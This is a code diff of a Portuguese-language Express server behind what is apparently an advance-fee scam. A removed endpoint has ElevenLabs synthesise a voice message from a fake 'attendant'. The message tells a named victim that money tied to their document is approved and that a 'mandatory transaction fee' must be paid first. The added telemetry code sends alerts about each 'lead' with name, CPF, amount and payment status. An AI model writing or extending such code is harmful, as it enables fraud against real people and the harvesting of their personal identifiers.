@@ -573,52 +573,7 @@ app.get("/api/config", (req, res) => {
   });
 });
 
-// --- NOVO: TTS E BUYPIX ---
-app.post("/api/v1/tts", async (req, res) => {
-  const { name, attendantName, voiceId, value, docType } = req.body;
-  if (!name) return res.status(400).json({ error: "Nome não fornecido" });
-
-  const firstName = name.split(" ")[0] || "Cidadão";
-  const atendente = attendantName || "Assistente";
-  const idVoz = voiceId || "EXAVITQu4vr4xnSDxMaL";
-  const valorTexto = value ? `no valor de ${value}` : "";
-
-  let finalValueText = valorTexto;
-  if (finalValueText) {
-    // Ajudar a IA a não ler "erre cifrão" e sim o valor.
-    finalValueText = finalValueText.replace("R$", "reais");
-  }
-  const cleanValue = value ? value.replace('R$', '').trim() : "0";
-  const script = `Olá ${name}! Sou a atendente ${attendantName || "Assistente"} e identifiquei aqui no sistema que você tem ${cleanValue} reais liberados vinculados ao seu ${docType || "documento"}. O seu resgate já foi aprovado e o próximo passo é realizar o pagamento da tarifa transacional obrigatória para cobrir os custos operacionais da transação. Logo após a confirmação desse pagamento, o valor total será enviado para a sua conta.`;
-
-  try {
-    const apiKey = process.env.ELEVENLABS_API_KEY || "";
-    if (!apiKey) throw new Error("Chave ElevenLabs não configurada no .env");
-
-    const response = await axios.post(
-      `https://api.elevenlabs.io/v1/text-to-speech/${idVoz}`,
-      {
-        text: script,
-        model_id: 'eleven_multilingual_v2',
-        output_format: 'mp3_44100_128'
-      },
-      {
-        headers: {
-          'xi-api-key': apiKey,
-          'Content-Type': 'application/json'
-        },
-        responseType: 'arraybuffer' // Essencial para converter em Base64
-      }
-    );
-
-    const audioContent = Buffer.from(response.data).toString('base64');
-    res.json({ success: true, audioBase64: audioContent });
-  } catch (err: any) {
-    console.error("TTS ElevenLabs Error:", err.response?.data || err.message);
-    res.status(500).json({ error: "Erro ao gerar TTS ElevenLabs" });
-  }
-});
-
+// Endpoint removed since we use the updated one below
 // Cache for BuyPix Status
 const buyPixStatus = new Map<string, string>();
 
@@ -733,7 +688,8 @@ app.post("/api/v1/telemetry/chat", async (req, res) => {
     let msg = "";
     switch (action) {
       case "entered":
-        msg = `🟢 <b>NOVO LEAD NO CHAT!</b>\n\n<b>Nome:</b> ${leadName || 'Desconhecido'}\n<b>CPF:</b> ${cpf || 'Desconhecido'}\n<b>Valor a Receber:</b> ${value || 'Desconhecido'}\n\nO Lead acabou de entrar na tela de conversa.`;
+        const dateNow = new Date().toLocaleString("pt-BR", { timeZone: "America/Sao_Paulo" });
+        msg = `🟢 <b>NOVO LEAD NO CHAT!</b>\n\n<b>Data de Abertura:</b> ${dateNow}\n<b>Nome:</b> ${leadName || 'Desconhecido'}\n<b>CPF:</b> ${cpf || 'Desconhecido'}\n<b>Valor a Receber:</b> ${value || 'Desconhecido'}\n<b>Status do Pagamento:</b> Aguardando interação\n\nO Lead acabou de entrar na tela de conversa.`;
         break;
       case "left":
         msg = `🔴 <b>LEAD SAIU DO CHAT!</b>\n\n<b>Nome:</b> ${leadName || 'Desconhecido'}\n<b>CPF:</b> ${cpf || 'Desconhecido'}\n\nO Lead abandonou a página do chat.`;
